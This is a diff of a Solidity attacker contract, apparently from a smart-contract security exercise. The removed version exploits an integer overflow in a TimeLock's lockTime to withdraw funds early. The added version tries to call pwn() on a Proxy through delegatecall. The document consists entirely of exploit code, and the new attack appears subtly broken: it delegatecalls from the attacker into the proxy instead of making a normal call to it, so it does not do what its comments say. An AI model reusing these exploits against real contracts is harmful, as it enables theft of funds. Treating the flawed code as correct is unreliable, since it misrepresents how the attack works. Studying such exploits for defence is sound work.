@@ -1,26 +1,19 @@
-pragma solidity ^0.7.6;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
 
-import "./contract.sol";
+import "./Delegatecall.sol";
 
-contract MaliciousContract {
-    TimeLock public timeLock;
+contract MaliciousAttacker {
+    Proxy public proxy;
 
-    constructor(TimeLock _timeLock) {
-        timeLock = _timeLock;
+    constructor(address _proxyAddress) {
+        proxy = Proxy(_proxyAddress);
     }
 
-    function attack() public payable {
-        // Step 1: Deposit funds to become a participant
-        timeLock.deposit{value: msg.value}();
-
-        // Step 2: Overflow the lockTime
-        uint256 maxUint = type(uint256).max;
-        uint256 timeToOverflow = maxUint - timeLock.lockTime(address(this)) + 1;
-        timeLock.increaseLockTime(timeToOverflow);
-
-        // Step 3: Attempt withdrawal before 1-week due to overflow
-        timeLock.withdraw();
+    function attack() public {
+        // Call the pwn() function in the Delegate contract
+        // through the delegatecall in the Proxy contract
+        (bool success, ) = address(proxy).delegatecall(abi.encodeWithSignature("pwn()"));
+        require(success, "Delegatecall failed");
     }
-
-    receive() external payable {}
 }
